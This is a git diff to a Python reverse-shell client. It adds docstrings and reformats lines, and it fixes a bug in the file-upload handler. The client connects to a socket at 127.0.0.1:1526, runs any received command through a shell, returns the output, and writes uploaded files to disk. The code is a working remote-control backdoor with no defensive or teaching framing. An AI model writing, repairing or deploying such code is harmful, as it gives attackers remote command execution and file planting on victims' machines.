@@ -4,11 +4,15 @@ import json
 import os
 import base64
 
+
 def send(data):
+    """Responsible for sending data"""
     json_data = json.dumps(data)
     sock.send(json_data)
 
+
 def receive():
+    """Responsible for receiving data"""
     data = ""
     while True:
         try:
@@ -17,7 +21,9 @@ def receive():
         except ValueError:
             continue
 
+
 def shell():
+    """Managing the shell commands sent to it."""
     while True:
         command = receive()
         if command == "":
@@ -30,7 +36,7 @@ def shell():
         elif command[:6] == "upload":
             with open(command[7:], "wb") as uload:
                 file_data = receive()
-                file.write(base64.b64decode(file_data))
+                uload.write(base64.b64decode(file_data))
 
         elif command == 'detach':
             continue
@@ -46,9 +52,11 @@ def shell():
                 continue
 
         else:
-            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                    stdin=subprocess.PIPE)
             results = proc.stdout.read() + proc.stderr.read()
             send(results)
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("127.0.0.1", 1526))
